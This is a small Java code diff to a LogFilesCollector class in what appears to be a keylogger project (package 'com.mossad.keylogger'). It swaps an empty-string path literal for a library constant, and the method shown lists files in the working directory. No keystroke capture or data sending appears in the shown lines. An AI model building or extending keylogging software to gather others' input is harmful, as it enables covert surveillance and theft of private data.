@@ -1,5 +1,6 @@
 package com.mossad.keylogger.files;
 
+import com.mmigdal.mossad.key.logger.library.KeyLoggerEntries;
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
@@ -19,8 +20,8 @@ public final class LogFilesCollector {
     }
 
     public List<String> collectLogs() {
-        //Path currentRelativePath = Paths.get("C:\\SWSetup\\
-        File currentDirectory = new File(new File("").getAbsolutePath());
+
+        File currentDirectory = new File(new File(KeyLoggerEntries.SIGN_EMPTY).getAbsolutePath());
         String pathAsString = currentDirectory.getAbsolutePath();
         try {
             Stream<Path> paths = Files.list(Paths.get(pathAsString));
